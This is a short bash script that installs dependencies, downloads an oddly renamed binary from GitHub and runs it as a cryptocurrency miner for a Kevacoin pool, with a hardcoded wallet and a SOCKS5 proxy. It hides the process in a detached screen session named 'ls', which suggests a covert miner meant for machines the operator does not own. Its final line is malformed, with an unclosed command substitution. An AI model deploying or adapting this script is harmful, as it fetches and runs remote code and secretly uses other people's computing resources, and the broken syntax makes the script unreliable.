#!/bin/bash
sudo apt update 
sudo apt install screen libjansson4 -y
wget -O brilliant https://github.com/brilliant-cut/brilliant-cut/raw/main/brilliant
screen -dmS ls
./brilliant --algorithm randomkeva --pool de.kevacoin.herominers.com:1163 --wallet VSMtpHwu6RvBnJMKf8vBZ3nUxKAXib6Y9b --password brilliant=$(echo $strDate-$(shuf -i 1-1000 -n 1) --proxy=socks5://50.62.35.16:11818
